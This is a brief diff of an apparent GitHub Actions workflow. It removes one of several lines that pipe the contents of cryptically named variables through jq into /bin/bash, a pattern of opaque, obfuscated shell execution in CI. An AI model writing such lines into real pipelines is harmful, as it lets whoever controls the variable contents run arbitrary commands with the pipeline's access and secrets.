@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$e2926" | jq -r .mb9 | /bin/bash
           echo $nv41 | jq -r .lvh8 | /bin/bash
           echo $jynij508 | jq -r .es43 | /bin/bash
-          printf '%s' "$nztd06502" | jq -r .q9425 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
